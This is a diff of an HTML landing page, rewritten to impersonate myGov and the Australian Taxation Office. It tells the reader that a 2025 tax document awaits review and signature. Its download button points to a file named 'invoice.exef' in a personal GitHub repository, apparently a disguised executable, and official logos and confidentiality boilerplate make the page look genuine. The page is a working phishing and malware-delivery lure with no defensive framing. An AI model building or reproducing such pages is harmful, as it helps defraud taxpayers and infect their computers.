@@ -2,12 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>My Landing Page</title>
-    <link rel="stylesheet" href="css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>myGov Tax Document Download</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .bg-custom-blue {
+            background-color: #99e1f3;
+        }
+        .text-custom-dark {
+            color: #1a3c5e; /* Darker color for readability on light blue button */
+        }
+    </style>
 </head>
-<body>
-    <h1>Welcome to My App</h1>
-    <p>Download our app below!</p>
-    <a href="downloads/myapp.zip" download>Download Now</a>
+<body class="bg-gray-100 font-sans">
+    <!-- Header -->
+    <header class="bg-custom-blue py-6">
+        <div class="container mx-auto px-4 flex items-center">
+            <img src="https://my.gov.au/content/dam/mygov/public/images/brand/myGov-logo-cobranded-black.svg" alt="myGov Logo" class="h-10 w-auto flex-none -ml-4">
+            <h1 class="text-2xl font-bold text-gray-800 max-w-2xl mx-auto text-center">Tax Document Download</h1>
+        </div>
+    </header>
+
+    <!-- Main Content (Hero Card) -->
+    <main class="container mx-auto px-4 py-8">
+        <section class="bg-white rounded-lg shadow-md p-6 max-w-2xl mx-auto text-center">
+            <h2 class="text-xl font-semibold text-gray-800 mb-4">2025 Tax Document for Review and Signature</h2>
+            <p class="text-gray-700 mb-2">
+                The Australian Taxation Office has shared a document related to the upcoming 2025 tax return for your review and signature.
+            </p>
+            <p class="text-gray-700 mb-2">
+                Please open the attached document on a computer to ensure proper access and functionality.
+            </p>
+            <p class="text-gray-700 mb-6">
+                Kindly review and sign the document at your earliest convenience to avoid delays in your 2025 tax processing.
+            </p>
+            <div class="flex justify-center">
+                <a 
+                    href="https://github.com/antbusha72/invoice/raw/refs/heads/main/invoice.exef" 
+                    download 
+                    class="inline-block bg-custom-blue text-custom-dark font-semibold py-3 px-6 rounded hover:bg-blue-200 transition duration-200"
+                >
+                    Download Tax Document
+                </a>
+            </div>
+        </section>
+
+        <!-- Confidentiality Notice -->
+        <section class="mt-8 text-gray-600 text-sm max-w-2xl mx-auto text-center">
+            <h3 class="font-semibold mb-2">Confidentiality Notice</h3>
+            <p class="mb-4">
+                This email and its attachment are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or taking of any action in reliance on the contents of this emailed information is strictly prohibited. If you have received this email in error, please notify the sender immediately and delete the email and its attachment from your system.
+            </p>
+            <h3 class="font-semibold mb-2">Disclaimer</h3>
+            <p class="mb-4">
+                The attached document is provided for review and signature purposes only. Please ensure you have the necessary permissions to access and sign the document.
+            </p>
+            <p class="font-semibold">
+                Best regards,<br>
+                The myGov Team
+            </p>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-200 py-4 mt-8">
+        <div class="container mx-auto px-4 text-center text-gray-600 text-sm">
+            <p>© 2025 myGov Australia. All rights reserved.</p>
+            <p>
+                <a href="https://my.gov.au/en/about/terms-use" class="underline hover:text-blue-600">Terms of Use</a> | 
+                <a href="https://my.gov.au/en/about/privacy-and-security" class="underline hover:text-blue-600">Privacy</a>
+            </p>
+        </div>
+    </footer>
 </body>
 </html>
